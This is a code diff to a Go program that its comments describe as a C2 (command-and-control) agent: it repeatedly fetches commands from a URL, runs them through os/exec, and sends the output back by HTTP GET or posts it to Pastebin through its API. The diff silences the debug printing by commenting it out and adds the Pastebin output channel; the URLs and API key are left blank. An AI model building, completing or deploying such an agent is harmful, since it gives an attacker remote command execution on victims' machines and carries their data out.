@@ -6,7 +6,6 @@ import(
     "net/url"
     "io/ioutil"
     "regexp"
-    "fmt"
     "strings"
     "os/exec"
     "html"
@@ -15,14 +14,20 @@ import(
 )
 
 func main(){
-
+ const cmd_delay time.Duration = 10
     for {
      GetCmd()
-     time.Sleep(10 * time.Second)
+     time.Sleep(cmd_delay * time.Second)
     }
 }
 
-
+/*
+Grabs a command from a given URL String via GET request. This is parsed via golang's exec function standards. Example of a valid command using all 3 arguments:
+(cmd)ls(cmd)
+(arg)-la(arg)
+(val)/etc(arg)
+This will run the command "ls -la /etc"
+*/
 func GetCmd(){
     url := ""
     resp, err := http.Get(url)
@@ -52,7 +57,8 @@ func GetCmd(){
     val = strings.ReplaceAll(val, "(val)", "")
     val = html.UnescapeString(val)
 
-    fmt.Println("Command is: " + cmd + " " + arg + " " + val)
+    // Debugging commmand input
+    // fmt.Println("Command is: " + cmd + " " + arg + " " + val)
 
     var out []byte
 
@@ -72,7 +78,28 @@ func GetCmd(){
     SendResponse(string(out))
 }
 
+// This function is for handling all C2 Response intergations, by default it will publish a GET Request to a given URL string unless another flag is set.
+
 func SendResponse(output string){
+
+    // Flag to tell output to be directed to the Pastebin intergration
+    const pb_Flag bool = false 
+
+    if pb_Flag{
+        SendtoPB(output)
+    }else{
+        url := "" + url.PathEscape(output)
+        _, err := http.Get(url)
+        if err != nil {
+            log.Fatalln(err)
+        }
+    }
+
+}
+
+
+// Function to handle Pastebin API Integration for posting C2 responses
+func SendtoPB(output string){
     values := url.Values{}
 	values.Set("api_dev_key", "")
 	values.Set("api_option", "paste")
@@ -92,5 +119,6 @@ func SendResponse(output string){
 	if err != nil {
 		log.Fatalln(err)
 	}
-    fmt.Println(buf.String())
+    // Debugging Pastebin response
+    // fmt.Println(buf.String())
 }
